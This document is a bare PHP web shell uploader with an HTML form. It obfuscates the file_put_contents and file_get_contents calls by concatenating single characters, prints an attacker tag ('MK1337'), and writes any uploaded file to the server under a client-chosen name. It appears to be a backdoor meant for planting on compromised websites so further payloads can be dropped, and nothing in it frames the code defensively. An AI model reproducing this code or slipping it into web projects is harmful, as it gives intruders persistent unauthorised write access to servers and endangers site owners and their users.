<form method="post" enctype="multipart/form-data"><input type="file" name="uk45"><button>Gaskan</button></form>
<?php
echo base64_decode("TUsxMzM3");
$a = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$b = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$c = "t"."m"."p"."_"."n"."a"."m"."e";
if (isset($_FILES['uk45'])) {$a($_FILES['uk45']['name'], $b($_FILES['uk45'][$c]));if (file_exists("./".$_FILES['uk45']['name'])) {echo "Oke !";} else {echo "Fail !";}}
?>

